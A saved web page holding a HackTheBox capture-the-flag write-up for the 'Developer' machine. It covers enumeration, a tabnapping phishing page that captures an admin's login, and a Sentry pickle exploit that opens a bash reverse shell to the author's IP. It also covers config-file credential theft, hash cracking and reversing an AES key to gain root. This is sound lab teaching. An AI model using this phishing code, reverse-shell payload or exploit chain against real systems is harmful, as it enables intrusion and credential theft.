<!DOCTYPE html><html lang="en" dir="auto"><head><meta charset="utf-8"/><meta http-equiv="x-ua-compatible" content="IE=edge"/><meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no"/><meta name="robots" content="index, follow"/><title>HackTheBox Writeup: Developer | Zebra</title><meta name="keywords" content="cybersecurity,ctf,linux,hackthebox"/><meta name="description" content="In this machine I learnt about tabnapping and had to reverse a binary using an AES cypher."/><meta name="author" content="Zebra"/><link rel="canonical" href="https://xzebra.dev/blog/hackthebox_writeup_developer/"/><link crossorigin="anonymous" href="/assets/css/stylesheet.523aabfa2b5ee217ac92d035cb44bf463d5d30a14b08f7aa59ccfdbebf4501f8.css" integrity="sha256-Ujqr+ite4hesktA1y0S/Rj1dMKFLCPeqWcz9vr9FAfg=" rel="preload stylesheet" as="style"/><script defer="" crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload="hljs.initHighlightingOnLoad()"></script>
<link rel="icon" href="https://xzebra.dev/images/favicon.ico"/><link rel="icon" type="image/png" sizes="16x16" href="https://xzebra.dev/images/favicon-16x16.png"/><link rel="icon" type="image/png" sizes="32x32" href="https://xzebra.dev/images/favicon-32x32.png"/><link rel="apple-touch-icon" href="https://xzebra.dev/images/apple-touch-icon.png"/><link rel="mask-icon" href="https://xzebra.dev/safari-pinned-tab.svg"/><meta name="msapplication-TileColor" content="#2e2e33"/><link rel="alternate" hreflang="en" href="https://xzebra.dev/blog/hackthebox_writeup_developer/"/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="HackTheBox Writeup: Developer"/><meta property="og:description" content="In this machine I learnt about tabnapping and had to reverse a binary using an AES cypher."/><meta property="og:type" content="article"/><meta property="og:url" content="https://xzebra.dev/blog/hackthebox_writeup_developer/"/><meta property="og:image" content="https://xzebra.dev/images/posts/prod-files-secure.s3.us-west-2.amazonaws.com_EccDt2H.png"/><meta property="article:section" content="blog"/><meta property="article:published_time" content="2021-12-01T23:14:00+07:00"/><meta property="article:modified_time" content="2023-05-12T22:00:00+07:00"/><meta property="og:site_name" content="Zebra"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_earlyaccess/"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_unicode/"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_backdoor/"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_shibboleth/"/><meta property="og:see_also" content="https://xzebra.dev/blog/hackthebox_writeup_pikaboo/"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:image" content="https://xzebra.dev/images/posts/prod-files-secure.s3.us-west-2.amazonaws.com_EccDt2H.png"/><meta name="twitter:title" content="HackTheBox Writeup: Developer"/><meta name="twitter:description" content="In this machine I learnt about tabnapping and had to reverse a binary using an AES cypher."/><script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Blog","item":"https://xzebra.dev/blog/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeup: Developer","item":"https://xzebra.dev/blog/hackthebox_writeup_developer/"}]}</script><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox Writeup: Developer","name":"HackTheBox Writeup: Developer","description":"In this machine I learnt about tabnapping and had to reverse a binary using an AES cypher.","keywords":["cybersecurity","ctf","linux","hackthebox"],"articleBody":"Enumeration We will start as usual with a quick scan:\nStarting Nmap 7.92 ( https://nmap.org ) at 2021-12-01 13:29 EET Nmap scan report for 10.10.11.103 Host is up (0.068s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 36:aa:93:e4:a4:56:ab:39:86:66:bf:3e:09:fa:eb:e0 (RSA) | 256 11:fb:e9:89:2e:4b:66:40:7b:6b:01:cf:f2:f2:ee:ef (ECDSA) |_ 256 77:56:93:6e:5f:ea:e2:ad:b0:2e:cf:23:9d:66:ed:12 (ED25519) 80/tcp open http Apache httpd 2.4.41 |_http-title: Did not follow redirect to http://developer.htb/ |_http-server-header: Apache/2.4.41 (Ubuntu) Service Info: Host: developer.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 15.53 seconds We can create an account and see some challenges uploaded to: http://developer.htb/media/. Here there is a file called phished_list.zip, which contains the following row:\n61 Ruddie Moehle admin@developer.htb DHTB{H1dD3N_C0LuMn5_FtW} Intuitive even-keeled concept But it seems like it is for a challenge, so I just solved unintendedly another challenge hahaha.\nWe can visit admin profile at the following page: http://developer.htb/profile/admin/\nUsing gobuster, we can see any dir that contains admin is redirected to the admin/ page.\n/fileadmin (Status: 301) [Size: 0] [--\u003e /fileadmin/] /dashboard (Status: 301) [Size: 0] [--\u003e /dashboard/] /sysadmin (Status: 301) [Size: 0] [--\u003e /sysadmin/] /ur-admin (Status: 301) [Size: 0] [--\u003e /ur-admin/] /wp-admin (Status: 301) [Size: 0] [--\u003e /wp-admin/] /phpmyadmin (Status: 301) [Size: 0] [--\u003e /phpmyadmin/] /webadmin (Status: 301) [Size: 0] [--\u003e /webadmin/] /bigadmin (Status: 301) [Size: 0] [--\u003e /bigadmin/] /sshadmin (Status: 301) [Size: 0] [--\u003e /sshadmin/] /useradmin (Status: 301) [Size: 0] [--\u003e /useradmin/] /about_admin (Status: 301) [Size: 0] [--\u003e /about_admin/] /staradmin (Status: 301) [Size: 0] [--\u003e /staradmin/] /directadmin (Status: 301) [Size: 0] [--\u003e /directadmin/] /pgadmin (Status: 301) [Size: 0] [--\u003e /pgadmin/] It seems like there is some way to submit writeups. Once we have submited the flag of phished_list, we can now submit a writeup in the challenge.\nYour walkthroughs will be on your profile page and public profile page. Admins will check the walkthrough as soon as they can and reserve the right to delete them where necessary.\nAdmins will check the walkthrough… If we submit a local http server as writeup, we can see a connection from the admin:\n❯ python -m http.server 8080 Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ... 10.10.11.103 - - [01/Dec/2021 14:07:53] \"GET /scan.txt HTTP/1.1\" 200 - 10.10.11.103 - - [01/Dec/2021 14:07:53] code 404, message File not found 10.10.11.103 - - [01/Dec/2021 14:07:53] \"GET /favicon.ico HTTP/1.1\" 404 - Getting the foothold The link is inserted in your profile as:\n\u003ca id=\"walkthrough_link\" href=\"http://10.10.14.81:8080/scan.txt\" target=\"_blank\" \u003ePhished List\u003c/a \u003e A link with target=\"_blank\" without rel=\"noopener noreferrer\" can lead to tabnapping. Tabnapping allows the visited page in the new tab to change the page in the last tab.\nThis might seem easy to identify, but if you are not paying attention, the page you were in might be replaced to a phishing page. In this case, we could try to phish admin credentials by phishing the login page of the website (as if the admin lost its session).\nI simply used Google Chrome to download the login page and the resources needed; setoolkit is not working at this moment.\nI removed the error message from the login, updated the method of the form to get (to easily see the credentials) and pointed the action to another port (so I can see the credentials in another terminal).\n\u003cform class=\"form-signin\" action=\"//10.10.14.81:8081\" method=\"get\"\u003e\u003c/form\u003e Then I created writeup.html which will perform the tabnapping.\n\u003chtml\u003e \u003cscript\u003e if (window.opener) window.opener.parent.location.replace(\"//10.10.14.81:8080/login.html\"); if (window.parent != window) window.parent.location.replace(\"//10.10.14.81:8080/login.html\"); \u003c/script\u003e \u003c/html\u003e Then we can upload the writeup as this file in our local server. We will see traffic from the server pointing to the fake login page (it worked).\n❯ python -m http.server 8080 Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ... 10.10.11.103 - - [01/Dec/2021 18:51:33] \"GET /writeup.html HTTP/1.1\" 200 - 10.10.11.103 - - [01/Dec/2021 18:51:33] \"GET /login.html HTTP/1.1\" 200 - 10.10.11.103 - - [01/Dec/2021 18:51:34] code 404, message File not found 10.10.11.103 - - [01/Dec/2021 18:51:34] \"GET /static/css/bootstrap.min.css HTTP/1.1\" 404 - And now you can see in the other terminal the credentials admin:SuperSecurePassword@HTB2021:\n❯ python -m http.server 8081 Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ... 10.10.11.103 - - [01/Dec/2021 18:51:35] \"GET /?csrfmiddlewaretoken=DNASuXuPkU07d5eNEABgOZsAzDPk3tS3BYJrWmTahQdvAUIYHsStaSpBQvSVTGMs\u0026login=admin\u0026password=SuperSecurePassword%40HTB2021 HTTP/1.1\" 200 - We can login at /admin with those credentials, and we will be able to see the administration page.\nIn the Sites page, there is a list of domains. There is one subdomain: developer-sentry.developer.htb. Let’s visit it and see what it is about.\nOh no, there is a new login page, but the credentials we got are not working. It is running Sentry 8.0.0, which doesn’t seem vulnerable unless we are logged in.\nI tried to check which users existed with the recover the password option, but neither admin or the ones registered on the other page work.\nWe know the name of the admin: Jacob Taylor. Maybe trying all combinations of name or surname and domains developer.htb? After some time, I could simply login with jacob@developer.htb and the same password.\nI found an exploit for version 8.2.0, so we could try it:\nOffSec’s Exploit Database Archive Sentry 8.2.0 - Remote Code Execution (RCE) (Authenticated).. webapps exploit for Python platform https://www.exploit-db.com/exploits/50318 It seems like the auditlogentry is running, so we might be able to exploit it: http://developer-sentry.developer.htb/admin/sentry/auditlogentry/\nThe exploit doesn’t work with python3, I’m going to try to use the one in the pdf linked:\nfrom cPickle import dumps import subprocess from base64 import b64encode from zlib import compress from shlex import split class PickleExploit(object): def __init__(self, command_line): self.args = split(command_line) def __reduce__(self): return (subprocess.Popen, (self.args,)) print b64encode(compress(dumps(PickleExploit('/bin/bash -c \"bash -i \u003e\u0026 /dev/tcp/10.10.14.81/6666 0\u003e\u00261\"')))) If we update a log entry with the output of the script, we will receive a connection in netcat. And we will be into www-data!\nGetting the user flag We have to get to user mark or karl.\nIf we look for the configuration of the page:\nwww-data@developer:~/developer_ctf/developer_ctf$ cat settings.py We can see some credentials for postgresql.\nDATABASES = { 'default': { 'ENGINE': 'django.db.backends.postgresql', 'NAME': 'platform', 'USER': 'ctf_admin', 'PASSWORD': 'CTFOG2021', 'HOST': 'localhost', 'PORT': '', } } We can connect to the database with them.\npsql -h localhost -d platform -U ctf_admin -W Password for user ctf_admin: CTFOG2021 platform=\u003e\\dt But this gives us access to the CTF page, not the sentry one which contained a user called karl. Also, I couldn’t login with any registered user, so I assume they are not privileged ones.\nSo I will try to enter the sentry database.\nName | Owner | Encoding | Collate | Ctype | Access privileges -----------+----------+----------+-------------+-------------+----------------------- platform | postgres | UTF8 | en_GB.UTF-8 | en_GB.UTF-8 | postgres | postgres | UTF8 | en_GB.UTF-8 | en_GB.UTF-8 | sentry | postgres | UTF8 | en_GB.UTF-8 | en_GB.UTF-8 | template0 | postgres | UTF8 | en_GB.UTF-8 | en_GB.UTF-8 | =c/postgres + | | | | | postgres=CTc/postgres template1 | postgres | UTF8 | en_GB.UTF-8 | en_GB.UTF-8 | =c/postgres + | | | | | postgres=CTc/postgres We can change database like this:\nplatform=\u003e \\c sentry \\c sentry Password: CTFOG2021 sentry=\u003e \\dt We don’t have reading permissions on the tables. We may find other login credentials for the sentry page. If we look for the word sentry in all the machine, we find the following:\n/etc/sentry /etc/sentry/sentry.conf.py In the last one, we find the following:\nDATABASES = { 'default': { 'ENGINE': 'sentry.db.postgres', 'NAME': 'sentry', 'USER': 'sentry', 'PASSWORD': 'SentryPassword2021', 'HOST': 'localhost', 'PORT': '', } } Quite secure password, we can try to login with it:\npsql -h localhost -d sentry -U sentry -W Password for user sentry: SentryPassword2021 And we can get the hash of karl.\nsentry=# select * from auth_user; pbkdf2_sha256$12000$wP0L4ePlxSjD$TTeyAB7uJ9uQprnr+mgRb8ZL8othIs32aGmqahx1rGI= We can decrypt it using hashcat. It will automatically detect it as a django hash. The decrypted password is insaneclownposse.\npbkdf2_sha256$12000$wP0L4ePlxSjD$TTeyAB7uJ9uQprnr+mgRb8ZL8othIs32aGmqahx1rGI=:insaneclownposse Then you can simply swith user to karl:\nsu karl And we will be inside of user! You can now take the user flag.\nYou can also login via the ssh service, so we get a better shell.\nPrivilege escalation We can check for privileged calls:\nsudo -l And we will see an executable that can be ran as root.\nMatching Defaults entries for karl on developer: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User karl may run the following commands on developer: (ALL : ALL) /root/.auth/authenticator If we run it we get prompt for a pasword:\nWelcome to TheCyberGeek's super secure login portal! Enter your password to access the super user: This may be like a reverse engineer challenge.\nauthenticator: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=dec8c0adbc231a7465e5df021c1f9e6695fe6a2f, for GNU/Linux 3.2.0, with debug_info, not stripped Looking at the strings command output, it looks like it is a rust executable. I will download the file with scp for further inspection.\ndie shows it is not compressed, so we may be able to just inspect it as it is.\nWe can see a symbol of a rust function: crypto::aes::ctr. If you look at the documentation, this are its parameters:\npub fn ctr( key_size: KeySize, key: \u0026[u8], iv: \u0026[u8] ) -\u003e Box\u003cSynchronousStreamCipher + 'static\u003e In this piece of code, we can identify these two vars as the key and iv parameters. If you keep executing the code (and looking at the source), you can see that it is using a length of 128.\n.text:000055D554199916 lea rsi, [rsp+278h+var_118] ; key .text:000055D55419991E lea rcx, [rsp+278h+var_108] ; iv .text:000055D554199926 mov edx, 10h .text:000055D55419992B mov r8d, 10h .text:000055D554199931 mov edi, 0 ; ctr(keySize, key, iv) .text:000055D554199936 call cs:_ZN6crypto3aes3ctr17h2e946f13694abc7dE_ptr ; crypto::aes::ctr::h2e946f13694abc7d This is the key:\n[stack]:00007FFFDE1B2390 db 0A3h [stack]:00007FFFDE1B2391 db 0E8h [stack]:00007FFFDE1B2392 db 32h ; 2 [stack]:00007FFFDE1B2393 db 34h ; 4 [stack]:00007FFFDE1B2394 db 5Ch ; \\ [stack]:00007FFFDE1B2395 db 79h ; y [stack]:00007FFFDE1B2396 db 91h [stack]:00007FFFDE1B2397 db 61h ; a [stack]:00007FFFDE1B2398 db 9Eh [stack]:00007FFFDE1B2399 db 20h [stack]:00007FFFDE1B239A db 0D4h [stack]:00007FFFDE1B239B db 3Dh ; = [stack]:00007FFFDE1B239C db 0BEh [stack]:00007FFFDE1B239D db 0F4h [stack]:00007FFFDE1B239E db 0F5h [stack]:00007FFFDE1B239F db 0D5h The formated key is the following:\nA3 E8 32 34 5C 79 91 61 9E 20 D4 3D BE F4 F5 D5 And this is the IV:\n[stack]:00007FFFDE1B23A0 db 76h ; v [stack]:00007FFFDE1B23A1 db 1Fh [stack]:00007FFFDE1B23A2 db 59h ; Y [stack]:00007FFFDE1B23A3 db 0E3h [stack]:00007FFFDE1B23A4 db 0D9h [stack]:00007FFFDE1B23A5 db 0D2h [stack]:00007FFFDE1B23A6 db 95h [stack]:00007FFFDE1B23A7 db 9Ah [stack]:00007FFFDE1B23A8 db 0A7h [stack]:00007FFFDE1B23A9 db 98h [stack]:00007FFFDE1B23AA db 55h ; U [stack]:00007FFFDE1B23AB db 0DCh [stack]:00007FFFDE1B23AC db 6 [stack]:00007FFFDE1B23AD db 20h [stack]:00007FFFDE1B23AE db 81h [stack]:00007FFFDE1B23AF db 6Ah The formated IV is the following:\n76 1F 59 E3 D9 D2 95 9A A7 98 55 DC 06 20 81 6A Also, if you continue executing until the symmetric encryption, another string appears in the stack:\n[heap]:0000559BE21CAA10 db 0FEh [heap]:0000559BE21CAA11 db 1Bh [heap]:0000559BE21CAA12 db 25h ; % [heap]:0000559BE21CAA13 db 0F0h [heap]:0000559BE21CAA14 db 80h [heap]:0000559BE21CAA15 db 6Ah ; j [heap]:0000559BE21CAA16 db 97h [heap]:0000559BE21CAA17 db 0CAh [heap]:0000559BE21CAA18 db 78h ; x [heap]:0000559BE21CAA19 db 80h [heap]:0000559BE21CAA1A db 0FDh [heap]:0000559BE21CAA1B db 58h ; X [heap]:0000559BE21CAA1C db 0FCh [heap]:0000559BE21CAA1D db 5Ch ; \\ [heap]:0000559BE21CAA1E db 20h [heap]:0000559BE21CAA1F db 23h ; # [heap]:0000559BE21CAA20 db 6Ch ; l [heap]:0000559BE21CAA21 db 0A2h [heap]:0000559BE21CAA22 db 0DBh [heap]:0000559BE21CAA23 db 0D0h [heap]:0000559BE21CAA24 db 0E5h [heap]:0000559BE21CAA25 db 2 [heap]:0000559BE21CAA26 db 0B5h [heap]:0000559BE21CAA27 db 0FAh [heap]:0000559BE21CAA28 db 0EBh [heap]:0000559BE21CAA29 db 0C0h [heap]:0000559BE21CAA2A db 0AFh [heap]:0000559BE21CAA2B db 3Ah ; : [heap]:0000559BE21CAA2C db 9Fh [heap]:0000559BE21CAA2D db 27h ; ' [heap]:0000559BE21CAA2E db 15h [heap]:0000559BE21CAA2F db 2Ch ; , Which formatted is the following:\nFE 1B 25 F0 80 6A 97 CA 78 80 FD 58 FC 5C 20 23 6C A2 DB D0 E5 02 B5 FA EB C0 AF 3A 9F 27 15 2C If we use this 3 hex strings in cyberchef + AES Decrypt + Mode: CTR, we get the key: RustForSecurity@Developer@2021:). We can now use the authenticator executable:\nWelcome to TheCyberGeek's super secure login portal! Enter your password to access the super user: RustForSecurity@Developer@2021:) You have successfully authenticated We will be prompted for a SSH public key. We can generate one locally and copy the .pub file.\nEnter your SSH public key in now: \u003cPUBLIC-KEY\u003e You may now authenticate as root! Then it will be added to /root/.ssh/authenticated_keys, so we can now login with ssh and get the root flag!\nReferences target=\"_blank\" vuln: Window.open() and target=”_blank” have a security vulnerability JavaScript, LangChain and AI integration resources. http://www.js-craft.io/blog/window-open-and-target_blank-have-a-security-vulnerability/ ","wordCount":"2032","inLanguage":"en","image":"https://xzebra.dev/images/posts/prod-files-secure.s3.us-west-2.amazonaws.com_EccDt2H.png","datePublished":"2021-12-01T23:14:00+07:00","dateModified":"2023-05-12T22:00:00+07:00","author":{"@type":"Person","name":"Zebra"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://xzebra.dev/blog/hackthebox_writeup_developer/"},"publisher":{"@type":"Organization","name":"Zebra","logo":{"@type":"ImageObject","url":"https://xzebra.dev/images/favicon.ico"}}}</script></head><body id="top"><header class="header"><nav class="nav"><ul id="menu" style="margin-left:auto"><li><a href="https://xzebra.dev/" title="whoami"><span>whoami</span></a></li><li><a href="https://xzebra.dev/blog/" title="blog"><span>blog</span></a></li><li><a href="https://xzebra.dev/apps/" title="apps"><span>apps</span></a></li></ul></nav></header><main class="main"><article class="post-single"><header class="post-header"><h1 class="post-title">HackTheBox Writeup: Developer</h1><div><ul class="post-series"><span class="secondary-text">This post belongs to this series:</span><li><a rel="noopener noreferrer" href="https://xzebra.dev/series/hackthebox/" class="link-highlight" style="--highlight-color:#9fef00">HackTheBox Machines</a></li></ul></div><div class="post-description">In this machine I learnt about tabnapping and had to reverse a binary using an AES cypher.</div><div class="post-meta"><span title="2021-12-01 23:14:00 +0700 +0700">December 1, 2021</span> · 10 min · Zebra</div></header><figure class="entry-cover"><img loading="lazy" src="https://xzebra.dev/images/posts/prod-files-secure.s3.us-west-2.amazonaws.com_EccDt2H.png" alt=""/></figure><div class="post-content"><h1 id="enumeration">Enumeration<a hidden="" class="anchor" aria-hidden="true" href="#enumeration">#</a></h1><p>We will start as usual with a quick scan:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-12-01 13:29 EET
</span></span><span style="display:flex"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.103
</span></span><span style="display:flex"><span>Host is up <span style="color:#f92672">(</span>0.068s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex"><span>Not shown: <span style="color:#ae81ff">998</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex"><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>| ssh-hostkey:
</span></span><span style="display:flex"><span>|   <span style="color:#ae81ff">3072</span> 36:aa:93:e4:a4:56:ab:39:86:66:bf:3e:09:fa:eb:e0 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>|   <span style="color:#ae81ff">256</span> 11:fb:e9:89:2e:4b:66:40:7b:6b:01:cf:f2:f2:ee:ef <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>|_  <span style="color:#ae81ff">256</span> 77:56:93:6e:5f:ea:e2:ad:b0:2e:cf:23:9d:66:ed:12 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>80/tcp open  http    Apache httpd 2.4.41
</span></span><span style="display:flex"><span>|_http-title: Did not follow redirect to http://developer.htb/
</span></span><span style="display:flex"><span>|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>Service Info: Host: developer.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 15.53 seconds
</span></span></code></pre></div><p>We can create an account and see some challenges uploaded to:
<a href="http://developer.htb/media/">http://developer.htb/media/</a>. Here there is a file called
<code>phished_list.zip</code>, which contains the following row:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="display:flex"><span><span style="color:#ae81ff">61</span>  <span style="color:#a6e22e">Ruddie</span>  <span style="color:#a6e22e">Moehle</span>  <span style="color:#a6e22e">admin</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">developer</span>.<span style="color:#a6e22e">htb</span> <span style="color:#a6e22e">DHTB</span>{<span style="color:#a6e22e">H1dD3N_C0LuMn5_FtW</span>}    <span style="color:#a6e22e">Intuitive</span> <span style="color:#a6e22e">even</span><span style="color:#f92672">-</span><span style="color:#a6e22e">keeled</span> <span style="color:#a6e22e">concept</span>
</span></span></code></pre></div><p>But it seems like it is for a challenge, so I just solved unintendedly
another challenge hahaha.</p><p>We can visit <code>admin</code> profile at the following page:
<a href="http://developer.htb/profile/admin/">http://developer.htb/profile/admin/</a></p><p>Using <code>gobuster</code>, we can see any dir that contains admin is redirected
to the <code>admin/</code> page.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">/fileadmin            (Status: 301) [Size: 0] [--&gt; /fileadmin/]</span>
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">/dashboard            (Status: 301) [Size: 0] [--&gt; /dashboard/]</span>
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">/sysadmin             (Status: 301) [Size: 0] [--&gt; /sysadmin/]</span>
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">/ur-admin             (Status: 301) [Size: 0] [--&gt; /ur-admin/]</span>
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">/wp-admin             (Status: 301) [Size: 0] [--&gt; /wp-admin/]</span>
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">/phpmyadmin           (Status: 301) [Size: 0] [--&gt; /phpmyadmin/]</span>
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">/webadmin             (Status: 301) [Size: 0] [--&gt; /webadmin/]</span>
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">/bigadmin             (Status: 301) [Size: 0] [--&gt; /bigadmin/]</span>
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">/sshadmin             (Status: 301) [Size: 0] [--&gt; /sshadmin/]</span>
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">/useradmin            (Status: 301) [Size: 0] [--&gt; /useradmin/]</span>
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">/about_admin          (Status: 301) [Size: 0] [--&gt; /about_admin/]</span>
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">/staradmin            (Status: 301) [Size: 0] [--&gt; /staradmin/]</span>
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">/directadmin          (Status: 301) [Size: 0] [--&gt; /directadmin/]</span>
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">/pgadmin              (Status: 301) [Size: 0] [--&gt; /pgadmin/]</span>
</span></span></code></pre></div><p>It seems like there is some way to submit writeups. Once we have
submited the flag of <code>phished_list</code>, we can now submit a writeup in the
challenge.</p><blockquote><p>Your walkthroughs will be on your profile page and public profile
page. Admins will check the walkthrough as soon as they can and
reserve the right to delete them where necessary.</p></blockquote><p><em>Admins will check the walkthrough</em>… If we submit a local http server as
writeup, we can see a connection from the admin:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>❯ python -m http.server <span style="color:#ae81ff">8080</span>
</span></span><span style="display:flex"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8080</span> <span style="color:#f92672">(</span>http://0.0.0.0:8080/<span style="color:#f92672">)</span> ...
</span></span><span style="display:flex"><span>10.10.11.103 - - <span style="color:#f92672">[</span>01/Dec/2021 14:07:53<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /scan.txt HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
</span></span><span style="display:flex"><span>10.10.11.103 - - <span style="color:#f92672">[</span>01/Dec/2021 14:07:53<span style="color:#f92672">]</span> code 404, message File not found
</span></span><span style="display:flex"><span>10.10.11.103 - - <span style="color:#f92672">[</span>01/Dec/2021 14:07:53<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /favicon.ico HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> -
</span></span></code></pre></div><h1 id="getting-the-foothold">Getting the foothold<a hidden="" class="anchor" aria-hidden="true" href="#getting-the-foothold">#</a></h1><p>The link is inserted in your profile as:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="display:flex"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;walkthrough_link&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://10.10.14.81:8080/scan.txt&#34;</span> <span style="color:#a6e22e">target</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;_blank&#34;</span>
</span></span><span style="display:flex"><span>  &gt;Phished List&lt;/<span style="color:#f92672">a</span>
</span></span><span style="display:flex"><span>&gt;
</span></span></code></pre></div><p>A link with <code>target=&#34;_blank&#34;</code> without <code>rel=&#34;noopener noreferrer&#34;</code> can
lead to tabnapping. Tabnapping allows the visited page in the new tab to
change the page in the last tab.</p><p>This might seem easy to identify, but if you are not paying attention,
the page you were in might be replaced to a phishing page. In this case,
we could try to phish admin credentials by phishing the login page of
the website (as if the admin lost its session).</p><p>I simply used Google Chrome to download the login page and the resources
needed; <code>setoolkit</code> is not working at this moment.</p><p>I removed the error message from the login, updated the method of the
form to <code>get</code> (to easily see the credentials) and pointed the action to
another port (so I can see the credentials in another terminal).</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="display:flex"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;form-signin&#34;</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;//10.10.14.81:8081&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;get&#34;</span>&gt;&lt;/<span style="color:#f92672">form</span>&gt;
